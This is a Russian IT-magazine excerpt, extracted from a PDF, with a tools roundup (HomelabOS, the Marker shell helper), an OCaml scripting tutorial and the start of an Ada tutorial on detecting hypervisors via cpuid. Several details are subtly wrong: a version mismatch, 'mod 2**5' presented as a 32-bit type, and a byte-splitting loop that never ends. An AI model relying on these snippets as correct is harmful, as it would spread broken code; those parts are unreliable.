        и репозиторий кода  Gitea, средства син хронизации контактов
        и заметок, агрегатор RSS и многие дру гие вещи.





       Список (ценный, кстати, и сам по себе) рас тет с каждой новой вер‐
        сией HomelabOS и по мере пос тупления заявок от пользователей.
       Каждое приложение — это контейнер Docker, что, с одной стороны,
        означает повышенную надежность, с дру гой — сулит оверхеды
        по производительности, так что HomelabOS — не для совсем сла‐
        бых конфигура ций.





                                Веб‐кон соль

       Для развертывания тебе потребуется сервер с Ubuntu (на момент
        написания этой заметки требуемая вер сия — 18.04), нас троенный
        на авторизацию ключом, а  также  Ansible на  твоей локальной
        машине. Единс твенная (но важная) часть набора, установка которой
        пока что не авто матизирована, — это OpenVPN, но есть простые
        инструкции по запуску.
        Читай так же: «Seedboxes. Как раз давать и скачивать
       торренты, не оставляя сле дов»


      MARKER — УТИЛИТА, КОТОРАЯ ПОДСКАЖЕТ ПАРАМЕТРЫ
      КОМАНД *NIX
       Командная строка — потрясающе мощный, но далеко не самый3         интуитив ный интерфейс. То же каса ется и самих консольных команд.
        Вот бы существо вал способ сра зу видеть все нужные параметры,
         когда ты набира ешь наз вание команды… и такой способ существу‐
          ет!
       Мы уже не раз писали о программах и сервисах, которые
        облегчают общение с терминалом. Например, может помочь TLDR
        pages — это вариант man, который дает только самые необходимые
        знания в наиболее сжатом виде. Другой вариант — это cheat.sh,
         занятный сервис, который при запросе из командной строки при‐
        сылает выдержки из самых раз ных читшитов (подробности — в
       нашем материале).
           Утилита под наз ванием Marker чем‐то напоми нает cheat.sh, но в
        отличие от него не требует соеди нения с интернетом и не работает
         как отдельная команда, а встраивает ся прямо в Bash или ZSH.
       Набираешь   какую‐нибудь  команду,  нажимаешь   Ctrl‐пробел
        и видишь список из наибо лее частых вариантов использования.
       Выбираешь нуж ный, и он вставляет ся в командную строку.





       Сочетание Ctrl‐t помогает быс тро передвигать курсор к началу бли‐
       жайшего плейсхол дера — они по умолчанию под ставлены вместо,
        например, названий файлов. То есть, чтобы, к примеру, распаковать
        архив .tar.gz, ты можешь написать tar, нажать Ctrl‐пробел, стрел кой
        вниз выбрать  строчку tar  xzf  {{source.tar.gz}},  вставить
           (Enter), а затем нажать Ctrl‐t, чтобы стереть пример в фигурных скоб‐
          ках. Вписываешь наз вание своего файла, и готово. Да, это дольше,
       чем просто набрать xzf, зато не нужно ничего помнить.
         Поскольку Marker — это надстройка над TLDR pages, в нем
        по умолчанию есть все распространенные команды и даже спе‐
       цифичные для FreeBSD и macOS (кстати, о маковских командах мы
        подробно писали). А вот сменить занятое на маке сочетание клавиш
         Ctrl‐пробел на что‐другое не так легко, и, похоже, это потребу ет пог‐
        ружения в исходники.
        Читай так же:  «Про качай терминал! Полез ные трюки,
       которые сде лают тебя гуру кон соли»
КОДИНГ

  СИЛА
  OCAML





     РАЗБИРАЕМСЯ С ТИПИЗАЦИЕЙ
        И ПИШЕМ СКРИПТЫ




Статически типизирован ные языки обычно
вынуждают   писать   типы  перемен ных
по любому поводу. Но уже далеко не всег‐
да: теория и практика языков программи‐
рования значительно ушли вперед, просто         Даниил Батурин                                                                                   Координатор проекта VyOS
эти  достижения  не  сразу  принимаются        (https://vyos.io),функциональщик,«языковед»,иногда
индустрией. Сегодня мы рассмотрим язык        сетевойdaniil@baturin.orgадминистратор.
OCaml и увидим, что статическая типизация
необязательно связана с неудобствами.


OCAML И СЕМЕЙСТВО ML
OCaml относится к семейству языков ML. К нему же относятся ныне редкий
Standard ML, Microsoft F#, который во многом представляет собой клон
OCaml, и, с оговорками, Haskell.
  Многие языки семейства ML способны производить статичес кую проверку
типов в коде, где нет ни одного объявления типа переменной благодаря
механизму вывода типов. Огра ниченную форму вывода типов многие уже
видели в Go, где можно не объявлять примитивные типы, а просто писать var
x = 10. Swift предоставляет те же возможности. OCaml идет гораздо дальше
и выводит типы функций.


let sqr x = x * x (* sqr : int ‐> int *)

Теоретическая основа вывода типов — алгоритм Хиндли — Милнера. Детер‐
минированный вывод типов воз можен не во всех системах. В частнос ти,
Haskell использует тот же подход, но функции в нем требуют явного объявле‐
ния типа. Цена детерминированности — отсутствие полиморфизма ad hoc
(перегрузки функций). Каждая функция в OCaml может иметь один и только
один тип. Отсутствие перегрузки функций компенсируется «функторами» —
параметризованными модулями.
   Swift заимство вал многие концепции из ML, в частности алгебраические
типы и параметрический полиморфизм, которые обес печивают удобную
и безопасную работу функций с коллекциями (списками) независимо от типа
значений. Новые языки для JS также зачас тую заимству ют из них, так что зна‐
комство с ML полезно для их понимания.


ПОЧЕМУ OCAML?
Традиционное применение OCaml и языков семейства ML — разработка
компиляторов, средств статического анализа и автомати ческого доказатель‐
ства теорем. К примеру, на нем был написан компилятор Rust до того, как он
научился компилировать сам себя. OCaml также нашел применение в финан‐
совой сфере, где ошибка в коде может за пару минут довести компанию
до банкротства, например в Lexiﬁ и Jane Street.
  Пригодным к применению в качестве скриптового его делает особенность
реализации: он предоставляет одновременно интерпре татор, компилятор
в байт‐код и компилятор в машинный код для популярных платформ, в том
числе x86 и ARM. Можно начать раз работку в интерактивной оболочке интер‐
претатора, затем записать код в файл. А если скрипт превращается в пол‐
ноценную программу, скомпилировать ее в машинный код.


             INFO

                  С  помощью  сторонних  инструментов  вроде
                          js_of_ocaml и BuckleScript код на OCaml также
                   можно компилировать в JavaScript. В Facebook
                       таким способом переписали большую часть Face‐
                      book Messenger на ReasonML, это альтернатив‐
                     ный синтаксис для OCaml.


В отличие от Haskell, в OCaml используется строгая, а не ленивая модель
вычислений, что упрощает ввод‐вывод и анализ производительности. Кроме
того, он поддерживает изменяемые переменные (ссылки) и прочие средства
императивного программирования.
  Мы не будем затрагивать веб‐скрипты и сос редоточимся на традици‐
онных. В этой статье я также намеренно опускаю создание собственных
типов, систему модулей и многие дру гие возможности. Первая цель —
показать «вкус» языка.


             INFO

                   В  этой  статье предполагается  использование
                       совместимой с POSIX системы: Linux, FreeBSD
                      или macOS. Сам OCaml работает на Windows,
                      но менед жер пакетов OPAM пока не поддержи‐
                        вает  эту систему, поэтому библиотеки приш‐
                       лось бы собирать вручную со всеми зависимос‐
                        тями. Теоретически использовать OPAM мож но
                        в Cygwin, но я не пробовал.



УСТАНОВКА
Стандартным менеджером пакетов для OCaml стал OPAM. Он может устанав‐
ливать сам компилятор, библиотеки и переключаться между раз ными вер‐
сиями. Многие системы предос тавляют какую‐то версию OCaml в репози‐
ториях (часто устаревшую), но с помощью OPAM легко пос тавить самую све‐
жую от имени обыч ного пользователя. Для Linux и macOS авторы пре дос‐
тавляют статически скомпилированную версию.


        WWW

                       Как  установить OPAM, ты можешь прочитать
                        в документации.


После установки мы поставим самую новую на нас тоящий момент версию
компилятора 4.07 и несколько утилит и биб лиотек, которые потребуются нам
в примерах.


$ opam switch 4.05
$ opam install utop lambdasoup

Для проверки работоспособности запус тим utop — интерактивную оболочку
интерпретатора. Стандартный интерпретатор  (ocaml) слишком «спартан‐
ский» — без поддержки истории команд и автодополнения, поэтому его мы
будем использовать только в неинтерактивном режиме.


$ utop
utop # print_endline "hello world" ;;
hello world
‐ : unit = ()

Интерактивный интерпретатор поз воляет вводить многос трочные выражения,
но из‐за этого для завершения вво да нужно применять символ ;;. Исполь‐
зовать его в исходном коде допустимо, но излишне.


             INFO

                    Компилятор  в  байт‐код  называется ocamlc,
                       а нативный компилятор — ocamlopt. Сегодня
                  мы столкнемся с ocamlc, но рассматривать ком‐
                     пиляцию не будем.



РАЗБИРАЕМ ЯЗЫК
Для первого примера мы напишем тра диционный hello world с допол нитель‐
ной фичей — возможностью уста новить при ветствие с помощью переменной
окружения GREETING.


(* Hello world program *)
let greeting_env_var = "GREETING"
let default_greeting = "Hello"
let get_greeting () =
  try
    Sys.getenv greeting_env_var
  with Not_found ‐> default_greeting
let greet someone =
  let greeting = get_greeting () in
  Printf.printf "%s %s\n" greeting someone
let _ = greet "world"

Сохраним код в файл hello.ml и поп робуем запус тить:


$ ocaml ./hello.ml
Hello world
$ GREETING="Hi" ocaml ./hello.ml
Hi world

Вместо выполнения из командной строки мы можем импорти ровать файл
в интерактивный интерпретатор с помощью директивы #use. В качестве
бонуса мы также увидим выведенные типы всех переменных и функций.


$ utop
utop # #use "hello.ml";;
val greeting_env_var : string = "GREETING"
val default_greeting : string = "Hello"
val get_greeting : unit ‐> string = <fun>
val greet : string ‐> unit = <fun>
Hello world
‐ : unit = ()
utop # greet "hacker" ;;
Hello hacker
‐ : unit = ()

Для простоты выпол нения можно сделать файл исполняемым и добавить #!/
usr/bin/env ocaml. На работу интерпретатора это не повлияет, но с точки
зрения компиляторов будет ошибкой син таксиса, поэтому в нашем примере
мы этого не делаем.
   Теперь разберем, что происходит в этом коде. Код начинается с ком‐
ментария, комментарии заключа ются в символы (* ... *).
  Сначала мы определяем две переменные с помощью ключевого слова
let. Синтаксис: let <имя> = <значение>. Кро ме глобальных объявлений
переменных, мы будем использовать локальные — с помощью конс трукции
let <имя> = <значение> in <выражение>. Такие объ явления могут быть
вложенными.


let n =
  let x = 1 in
  let y = 2 in
  x + y

Затем мы определяем функцию, которая выдает значение переменной окру‐
жения GREETING, если она определена, или зна чение по умолчанию, если нет.
Синтаксис функций мало отличается от син таксиса для переменных: let <
имя> <список формальных параметров> = <тело>.
  В качестве формального парамет ра мы берем () — значение типа unit,
которое часто исполь зует ся как заглушка: функций без аргументов и воз вра‐
щаемых значений в OCaml быть не может. Как и во всех функци ональных язы‐
ках, оператора return тут нет — функции не возвращают значения, а вычис‐
ляются в них.
   Если переменная не определена, функция Sys.getenv выдает исключение
Not_found, которое мы обра батываем с помощью конструкции try  ...
with ....


Осо бен ности исклю чений
Исключения в OCaml не являются объекта ми, и в нем нет иерархии исклю‐
чений. Можно создавать новые исклю чения всего одной строкой и переда‐
вать в них значения любых типов:


 exception Error_without_message
 exception Error_with_message of string
 exception Error_with_number of int




Далее мы определяем функцию с настоящим аргументом — адре сатом при‐
ветствия. Выделенной точки входа, вро де main в C, в OCaml нет. Все выраже‐
ния программы просто вычисляются сверху вниз. Мы вызываем функцию
greet и игнорируем ее зна чение с помощью конс трукции let _ = greet
"world".


             INFO

                    Более правильным способом будет let () =
                   greet "world", потому что попытка исполь‐
                        зовать значение не типа unit на правой стороне
                     выражения станет ошибкой типизации. Это час‐
                      тный случай сопоставления с образцом.



Просмотр выведен ных типов
Мы уже видели, что интерактивный интерпретатор показывает все выведен‐
ные типы, но это можно сделать и в неин терактивном режиме. Самый прос‐
той способ увидеть типы переменных и функций — запустить ocamlc ‐i. Эта
же команда часто применя ется для автоматической генерации интерфейсов
модулей.


$ ocamlc ‐i ./hello.ml
val greeting_env_var : string
val default_greeting : string
val get_greeting : unit ‐> string
val greet : string ‐> unit

Типы функций пишутся через стрелки, в unit ‐> string на левой стороне
стрелки — тип аргумента, а на правой — тип воз вра щаемого значения. У фун‐
кции со многими аргу ментами стрелок будет больше: int  ‐>  int  ‐>
string — функция от двух целочисленных зна чений, которая воз вращает
строку.


             INFO

                    Быстро просматривать выведенные типы очень
                      помогает сторонний инструмент под названием
                           Merlin. Он интегрируется со многими популяр‐
                    ными  редакторами  и  позволяет  увидеть  тип
                      выделенного выражения в тек сте.



Типобе зопасный printf
Попробуем внести в нашу программу ошиб ки. Нап ример, используем неп‐
равильный формат в printf. В большинстве языков это будет ошибкой вре‐
мени выполнения или ошибкой сегмента ции, но не в OCaml. Заменим %s
на %d и запустим:


$ ocaml ./hello.ml
File "./hello.ml", line 14, characters 26‐34:
Error: This expression has type string but an expression was
expected of type
         int

Тип выражения с printf выводится в зависи мости от строки формата,
и несовпадение фор мата с типом фактичес кого параметра приводит к ошиб‐
ке компиляции.
  Попробуем заменить greet "world" на greet 42:


$ ocaml ./hello.ml
File "./hello.ml", line 16, characters 14‐16:
Error: This expression has type int but an expression was expected
of type
         string

Эффект тот же: компилятор понял, что greet имеет тип string ‐> unit,
и возмутился, когда вместо строки в качестве аргу мента использовали чис ло.


Инфик сные опе рато ры и частичное примене ние фун кций
Перегрузки функций и операто ров в OCaml нет, зато можно создавать свои
инфиксные операторы. Операторы определяются так же, как и функции, но их
символы нужно заключить в скобки.


let (++) x y = x + y + y
let x = 2 ++ 3
let () = Printf.printf "%d\n" x

Если оператор начинается с символа *, следует пос тавить пос ле скобки про‐
бел, чтобы компилятор не принял выражение за начало комментария:


let ( *@ ) x y = x * y * y

Стандартная библиотека предоставляет ряд полез ных операторов вроде |>,
который позволяет легко строить цепочки выражений без лишних скобок.
Если бы  его  не  было,  его можно было бы  легко  опре делить  как
let (|>) x f = f x .


let () = "hello world" |> String.length |> Printf.printf "%d\n"

Здесь значение hello world переда ется функции String.length, а затем
значение передается дальше в printf. Особенно удобно это бывает в инте‐
рактивном интерпретаторе, когда нужно применить еще одну функцию к пре‐
дыдущему выражению.
  Можно заметить, что у printf здесь указан только один аргумент — фор‐
матная строка. Дело в том, что в OCaml любую функцию со многими аргумен‐
тами можно применить частично (partial application), просто опус тив часть
аргументов.
   Тип функции Printf.printf "%s %s\n" будет string ‐> string ‐>
unit — формат зафик сирован, но аргументы для строк свободны. Если ука‐
зать еще один аргумент, мы получим функцию типа string ‐> unit с фик‐
сированным первым аргументом, которую сможем применить ко второму.


let greet = Printf.printf "%s %s\n" "Hello"
let () = greet "world"


Чте ние файлов
Теперь напишем тривиальный ана лог cat — прог рамму, которая читает стро‐
ки из файла и выдает их на стандартный вывод. Здесь мы задействуем опе‐
ратор |> и средства императивного программирования.


let fail msg =
  print_endline msg;
  exit 1
let open_file path =
  try open_in path
  with Sys_error msg ‐> fail msg
let read_file input_channel =
  try
    while true do
      input_line input_channel |> print_endline
    done
  with End_of_file ‐> close_in input_channel
let () = open_file Sys.argv.(1) |> read_file

Функция fail выводит сооб щение об ошиб ке и завершает выполнение прог‐
раммы с кодом 1. Два выражения раз делены точкой с запятой, как в боль‐
шинстве императив ных языков. Нужно только помнить, что в OCaml точка
с запятой не завершает выражения, а раз деляет их. Ставить ее пос ле пос‐
леднего выраже ния нель зя. Последнее выражение в цепочке становится воз‐
вращаемым значением функции.
  Далее мы пишем функцию, которая откры вает файл на чтение и возвра‐
щает его дескриптор либо завершает программы с ошибкой, если возникло
исключение.
  Файл мы открываем с помощью функции open_in : string ‐> in_chan‐
nel. В OCaml дескрипторы файлов для чтения и записи — это значения раз‐
ных несовместимых типов  (in_channel и out_channel), поэтому попытки
писать в файл, открытый только для чтения (или наоборот — читать из откры‐
того только для записи), будут пойманы еще на этапе проверки типов.
  В функции read_file мы используем цикл while с достаточ но очевидным
синтаксисом.


Из меняемые перемен ные
По умолчанию все переменные в OСaml неизменя емые. Их значения можно
переопределить, но модифициро вать нельзя. Такой подход гораздо безопас‐
нее, но иногда обой тись без присваивания сложно.
  Для этой цели применяются ссылки. Создать ссылку можно с помощью
функции ref, которая возвращает значения типа 'a ref. Буква с апострофом
означает, что этот тип полиморфный — на ее месте может быть любой тип,
например int ref или string ref.
  Присвоить ссылке новое зна чение можно с помощью оператора :=,
а получить ее текущее значение — с помощью !.
  Для демонстрации мы напишем аналог wc, который считает строки в фай‐
ле. Ради простоты возьмем наш cat, но прочитанные строки проигнорируем
с помощью let _ = и добавим lines := !lines + 1 через точку с запятой.
Очень важно не забывать получать значение ссылки с помощью !, иначе
будет ошибка компиляции — зна чения и ссылки на них четко разделены.


let lines = ref 0
let wc path =
  let input_channel = open_in Sys.argv.(1) in
  try
    while true do
      let _ = input_line input_channel in
      lines := !lines + 1
    done
  with End_of_file ‐>
    close_in input_channel;
    Printf.printf "%d %s\n" !lines path
let () = wc Sys.argv.(1)

Веб‑скре пинг
Можно поспорить, что предыдущие примеры не были такими уж «скрип‐
товыми». В завершение я про демонстри рую извлечение заголовков новостей
из главной страницы «Хакера» с помощью биб лиотеки lambdasoup.
  Мы могли бы выпол нить запрос HTTP из самого скрипта, например
с помощью библиотеки cohttp, но для экономии вре мени будем читать
вывод curl со стандартного вво да.


#!/usr/bin/env ocaml
#use "topfind";;
#require "lambdasoup";;
open Soup.Infix
let default default_value option_value =
  match option_value with
    Some str ‐> str
  | None ‐> default_value
let get_news_header node =
  node $ "span" |>
  Soup.leaf_text |>
  default ""
let soup = Soup.read_channel stdin |> Soup.parse
let () =
  let news = soup $$ ".entry‐title" in
  Soup.iter (fun x ‐> get_news_header x |> print_endline) news

Сохраним код в файл ./x_news.ml и выпол ним:



  $ curl https://xakep.ru 2>/dev/null | ./x_news.ml | head ‐n 2
  Вымогатели по‐прежнему захватывают установки MongoDB
  Google Adiantum сделает надежное шифрование доступным


Что происходит в этом коде? Сначала мы подклю чаем библиоте ки. Механизм
их под ключения не является частью язы ка, а реализован в библиотеке ком‐
пилятора topfind. Сначала мы импортируем ее с помощью #use "topfind".
Затем мы используем директиву #require из этой библиотеки, чтобы под‐
клю чить пакет lambdasoup, установленный из OPAM. В utop мы можем сразу
использовать #require, потому что он автоматически подключает topfind,
но в стандартном интерпретаторе этот шаг необходим.


             INFO

                   Директивы интерпретато ра  также не являются
                       частью языка, а реализуются через расширения.
                    При желании можно даже создать свои.


С помощью open Soup.Infix мы импортирова ли модуль, где определены
инфиксные операторы LambdaSoup в основное пространство имен. К осталь‐
ным его функциям мы будем обра щать ся по их полным названиям, вроде
Soup.read_channel. Оператор $$ выглядит знакомо для каждого поль‐
зователя библиотек вроде jQuery — он извлекает соответству ющие селек‐
тору элементы из дерева HTML, которое мы получи ли из Soup.parse.
  Поскольку на главной странице «Хакера» заголовки новостей находятся
в тегах <h3> с классом entry‐title, а сам текст заголовка — в его дочернем
теге <span>, в get_news_header мы применяем селектор span и передаем
результат функции Soup.leaf_text, которая извлекает из элемента текст.
  Элементы в HTML могут не иметь текста, поэтому для функции Soup.
leaf_text авторы исполь зовали особый тип: string option. Значения типа
string option могут быть двух видов: None или Some <значение>. Такие
типы — альтернатива исключениям, которые в принципе невозможно про‐
игнорировать, поскольку тип string option несовместим со string и, чтобы
извлечь значение, нужно обра ботать и ситуацию с None.
  В функции default мы раз бираем оба слу чая с помощью оператора
match, который можно рассмат ривать как эквивалент case из C и Java, хотя
его возможности шире. В случае с None мы воз вра щаем указанное в аргу‐
менте значение по умолчанию, а в случае с Some — возвращаем присоеди‐
ненную к Some строку.
  Наконец, в Soup.iter мы переда ем ано нимную функцию, которую она
применит к каждому элементу из news.


ЗАКЛЮЧЕНИЕ
Компактный синтаксис, отсутствие необ ходимости писать объ явле ния типов
и интерактивные средства разработ ки делают OCaml пригодным для больших
серьезных проектов и для небольших программ и скриптов. В то же вре мя
статическая провер ка типов помога ет писать надеж ные и безопас ные прог‐
раммы, а возможность компиляции в машин ный код или JS обес печивает
языку широкий спектр применения.
  Многие возможности системы типов оста лись за кадром — например,
в ряде случаев она может обнаружить проб лемы с логикой кода вроде бес‐
конечных циклов, а не толь ко простое несовпадение типов переменных.
  Из проблем можно отметить меньшее количество библиотек, чем у других
языков, некоторый минимализм стандартной биб лиоте ки и недостаточную
поддержку Windows, но эта ситуация пос тепенно улучшается. Также текущий
механизм сборки мусора ограничивает про изводительность на многоп‐
роцессорных системах из‐за бло кировок в биб лиотеке времени выполнения,
но и в этом направле нии ведутся работы.
   Если ты ищешь новый язык для прикладных программ, не посмотреть
на OCaml будет большим упущением.
КОДИНГ
НА ЧТО
СПОСОБНА
АДА





                   ДЕЛАЕМ УТИЛИТУ
           ДЛЯ ДЕТЕКТА ГИПЕРВИЗОРА
             НА ПОЛУЗАБЫТОМ ЯЗЫКЕ





Лучше всего познавать язык на реальном
проекте, поэтому, когда я решил поэкспе‐
риментировать с адой, я поставил себе
реальную и интересную задачу: написать
утилиту для детекта работы в гипервизоре.         Даниил Батурин                                                                                   Координатор проекта VyOS
Это само по себе занятно, а новый язык        (https://vyos.io),функциональщик,«языковед»,иногда
программирования позволит вывести раз‐        сетевойdaniil@baturin.orgадминистратор.
влечение на новый уровень.


Нередко бывает, что в теории язык или его конкрет ная реализация выглядит
хорошо, но попытки использовать его на практике упираются в труд нопре‐
одолимые препятствия: сложность  вза имодействия с другими языками
или распространения исполня емых файлов.
   Когда я впер вые познакомился с адой, мне стало интересно попробовать
ее в реальности, но мне была нуж на подходящая задача — достаточно
небольшая, чтобы цена провала оказалась невелика, но и достаточно слож‐
ная, чтобы выявить как можно больше потенциальных проблем.
  Про сборку программ на аде было рас сказано в моей предыдущей статье,
но если пропустил — не страшно, ничего слож ного в этом нет. Нужно пос‐
тавить GNAT — он входит в состав GCC и всег да есть в репозиториях, — сох‐
ранить код в файл something.adb и выпол нить gnatmake something.adb.
  Желательно,  чтобы на мес те something в имени файла было имя
основной процедуры, ина че компилятор выдаст предупреждение. Исполня‐
емый файл gnatmake автоматичес ки назовет по имени файла с кодом, а не a.
out.


             INFO

                    Один из моих про ектов — VyOS — дистрибутив
                       GNU/Linux  для  маршрутизаторов.  Над  ним
                       работала команда специалистов, в которой я
                     выступал координатором.


По ряду причин я решил написать утилиты для определения гипервизора,
в котором работает виртуальная машина. В VyOS мы включаем эту информа‐
цию в вывод команды show  version. Для получения самой информации
исторически использовалась самописная утилита на довольно грязном C,
которая не поддерживала некоторые менее популярные гипервизоры, и у
меня давно было желание ее чем‐нибудь заменить.
  Существующие решения, такие как virt‐what, вызывают у меня смешанные
чувства. Смесь C и скриптовых языков, на мой взгляд, выглядит неэстетично.
Эстетика — вещь субъективная, но есть и объективные проблемы, например
поддержка только GNU/Linux и отказ работать без прав суперпользователя.
  Мне хотелось, чтобы замена старому коду принесла пользу не только мне
и пользователям VyOS, поэто му я поставил следующие требования:
 • поддержка как минимум GNU/Linux и FreeBSD;
 • возможность работы с правами обычного пользовате ля;
 • по крайней мере техничес кая возможность работы на раз ных архитек‐
   турах;
 • простая и доступная незнакомому с адой пользователю процедура сбор‐
   ки.

Задача мне показалась вполне подходящей для тестирования нового язы ка.
В случае провала я всег да мог бы переписать код на Rust или взять одну
из существующих утилит. Эксперимент завершился, на мой взгляд, успешно,
результат был назван hvinfo и уже давно исполь зуется в VyOS. Исходный код
можно найти по адресу github.com/dmbaturin.
  В этой статье мы рассмотрим про ект изнутри и познакомимся с воз‐
можностями языка ада и инстру ментами GNAT, которые потребовались
для его разработки.


СПОСОБЫ ОПРЕДЕЛЕНИЯ ГИПЕРВИЗОРА
Как, собственно, определить, работает ли система в виртуальной машине,
и если да, то на каком гипер визоре? На платформе x86 все системы вир‐
туализации с этой точ ки зрения можно поделить на две группы: одни под‐
держивают общий стандарт de facto — передачу информации через вызов
инструкции cpuid, другие не поддерживают.


Определе ние через cpuid
К первой группе относятся Xen в режиме аппа рат ной виртуализации, KVM,
bhyve, VMware и Hyper‐V. Я не уверен, кто из них ввел этот механизм первым,
но работает он у всех одинаково.
  Инструкция cpuid была впервые реализована компанией Intel и с тех пор
присутствует во всех процессорах x86. Стоит отметить, что для совмести мос‐
ти она использует 32‐разрядные регистры даже в 64‐разрядном режиме. Вид
возвращаемой информации зависит от значения в регис тре eax.
   Гипервизоры из первой группы перехватывают вызовы cpuid и обладают
дополнительными возможностями. Для передачи информации о самом факте
работы ОС в виртуальной машине применя ется раз ряд 31‐го регистра ecx.
На физических машинах он всегда уста новлен на ноль согласно докумен‐
тации Intel, а гипервизоры уста навливают его на единицу.
  Получить название гипер визора можно, выз вав cpuid со значением
0x40000000 в регистре eax. Название переда ется в виде строки длиной
до двенадцати символов в регистрах ebx, ecx и edx. К примеру, Xen исполь‐
зует строку XenVMMXenVMM, а VMware — VMwareVMware.


             INFO

                      Название производите ля процессора переда ется
                       таким же способом. Имен но поэто му используют‐
                        ся строки вроде GenuineIntel и Authenti‐
                   cAMD — не чтобы убедить пользователя, что про‐
                      цессор не поддельный, а чтобы строка укладыва‐
                        лась в три 32‐разрядных регистра без допол‐
                       нения нулями.


Использование инструкций процес сора дает нам отличную возможность уви‐
деть работу с ассемблерными вставками, двоичную арифметику и условную
компиляцию.


Про чие спо собы
Некоторые гипервизоры не используют сло жившийся интерфейс cpuid, нес‐
мотря на полную виртуализацию, нап ример VirtualBox в режиме двоичной
трансляции. Паравир туальный Xen прос то не может его использовать.
  В этих случаях приходится применять дру гие способы, такие как проверка
названия производите ля из SMBIOS или наличия специфичных устройств PCI,
вроде видеокарты innotek Gmbh в VirtualBox.
   Эти способы, в отличие от cpuid, не так универсальны, и на разных ОС их
придется реализовать по‐разному. Что бы это сделать, нам придется исполь‐
зовать интерфейс с libc и работу с файлами.


РАБОТА С МАШИННЫМ КОДОМ И ДАННЫМИ
Ассемблерные вставки
Ада проектировалась как язык системного прог рамми рования, а какое сис‐
темное программирование совсем без машинного кода? Все возможности
для этого присутствуют.
  Прежде всего нам потребуются беззна ковые целочисленные типы. Пакет
Interfaces предоставляет все распростра ненные типы, включая нужный нам
для работы с 32‐разрядными регистра ми Unsigned_32.


             INFO

                    Ничего магического в беззнаковых типах нет, и их
                   можно легко определить самим: type My_Un‐
                   signed_32 is  mod  2**5. Или даже type
                   Strange_Unsigned is mod 19.


Нам также нужно знать, как работать с шестнадцатеричными числами. Ада
использует несколь ко необычный синтаксис: <основание>#<значение>#.
Таким образом, число 0x40000000 пишется 16#40000000#. Основание сис‐
темы счисления может быть вообще любым, хоть троичным — такое нам,
к счастью, не потребуется.
  Процедуру Asm можно найти в пакете System.Machine_Code. Конкретный
интерфейс и реализация стандартом не рег ламентиру ются и оставлены
на усмотрение разработчиков компилятора. У процедуры два параметра: In‐
puts и Outputs, которые могут быть либо отдельными значениями, либо мас‐
сивами. Синтаксис обращений к регистрам напоминает макрос __asm__
из GNU C, но есть значительное отличие: регистры сопоставля ются перемен‐
ным не просто по указателям, а с помощью функций‐атрибутов Asm_Input
и Asm_Output, например Unsigned_32'Asm_Input.


             INFO

                       Как везде в GCC, по умолчанию использует ся
                       син таксис AT&T.


Для демонстрации мы напишем прос тую программу, которая складывает
два 32‐разрядных числа с помощью addl %eax, %ebx.


with Interfaces; use Interfaces;
with System.Machine_Code; use System.Machine_Code;
with Ada.Text_IO;
procedure Asm_Test is
    Left, Right : Unsigned_32;
begin
    Left := 1; Right := 2;
    Asm("addl %1, %2",
        Inputs => (Unsigned_32'Asm_Input ("a", Left),
                   Unsigned_32'Asm_Input ("b", Right)),
        Outputs => Unsigned_32'Asm_Output ("=b", Right));
    Ada.Text_IO.Put_Line (Unsigned_32'Image (Right));
end Asm_Test;

Напомню, что для сборки нужно сохранить программу в файл asm_test.adb
и выполнить команду gnatmake  asm_test.adb. Исполня емый файл будет
называться asm_test.
  Вывести ассемблерный листинг мож но как обычно в GCC: gcc ‐S as‐
m_test.adb. В полученном файле asm_test.s мы сможем увидеть что‐то
вроде


#APP
# 10 "./asm_test.adb" 1
        addl %eax, %ebx
# 0 "" 2
#NO_APP


Дво ичная арифметика
Чтобы определить факт виртуализации, нам потребуется извлечь  раз‐
ряд 31 из регистра ecx. Наз вание гипервизора мы получим не в виде строки,
а в виде трех 32‐разрядных чисел, которые еще предстоит перевес ти в стро‐
ку. Здесь не обой тись без двоичной арифметики. К счастью, проблем с этим
не возникнет.
  Все поразрядные логические операции есть в стандартной библиотеке,
без импорта допол нитель ных пакетов дос тупны not, and, or и xor. Операции
сдвига доступны из того же пакета Interfaces и называются Shift_Left
и Shift_Right. Благодаря перегрузке функций они доступны для всех опре‐
деленных там беззнаковых типов под одинаковыми именами.
   Если мы уже как‐то получили зна чение из регистра ecx, с помощью сдвига
на 31 разряд и применения мас ки 1 мы можем определить, находимся мы
в виртуальной машине или нет:


if (((Shift_Right (ecx, 31)) and 1) = 1) then
    Hypervisor_Present := True;
else
    Hypervisor_Present := False;
end if;

Таким же способом мы можем разобрать 32‐разрядное число на бай ты. При‐
меним маски 16#FF и сделаем сдвиг на восемь двоичных разрядов, пока чис‐
ло не станет равным нулю. Останется только преобразовать байты в сим‐
волы, для этого мы исполь зуем атрибут Val типа Character (Character'Val),
эквивалент функции chr.


while Register > 0 loop
    Ada.Strings.Unbounded.Append (Result, Character'Val (Word and 16#
FF#));
    Word := Shift_Right (Register, 8);
end loop;


Со бираем воедино и опре деляем гипервизор через cpuid
with Interfaces; use Interfaces;
with System.Machine_Code; use System.Machine_Code;
with Ada.Strings.Unbounded;
with Ada.Text_IO;
with Ada.Text_IO.Unbounded_IO;
procedure Hypervisor_Name is
    package US renames Ada.Strings.Unbounded;
    type CPUID_Registers is array (1 .. 4) of Unsigned_32;
    Hypervisor_Leaf : constant := 16#40000000#;
    function CPUID (Arg : Unsigned_32) return CPUID_Registers is
        eax, ebx, ecx, edx : Unsigned_32;
    begin
        Asm("cpuid",
            Outputs => (Unsigned_32'Asm_Output ("=a", eax),
                        Unsigned_32'Asm_Output ("=b", ebx),
                        Unsigned_32'Asm_Output ("=c", ecx),
                        Unsigned_32'Asm_Output ("=d", edx)),
            Inputs  => Unsigned_32'Asm_Input ("a", Arg));
        return (eax, ebx, ecx, edx);
    end CPUID;
    function String_of_U32 (Arg : Unsigned_32) return US.Unboun
ded_String is
        Word : Unsigned_32;
        Result : US.Unbounded_String;
    begin
        Word := Arg;
        while Word > 0 loop
            US.Append (Result, Character'Val (Word and 16#FF#));
            Word := Shift_Right (Word, 8);
        end loop;
        return Result;
    end String_of_U32;
    Registers : CPUID_Registers;
    Hypervisor_String : US.Unbounded_String;
begin
    ‐‐ Check if hypervisor is present
    Registers := CPUID (1);
    if (((Shift_Right (Registers(3), 31)) and 1) = 1) then
        Ada.Text_IO.Put_Line ("Hypervisor is present");
        Registers := CPUID (Hypervisor_Leaf);
        declare
            use US;
        begin
            Hypervisor_String := To_Unbounded_String ("");
            for I in 2.. CPUID_Registers'Last loop
                Hypervisor_String := Hypervisor_String & (String
_of_U32 (Registers(I)));
            end loop;
            Ada.Text_IO.Unbounded_IO.Put_Line (Hypervisor_String);
        end;
    end if;
end;

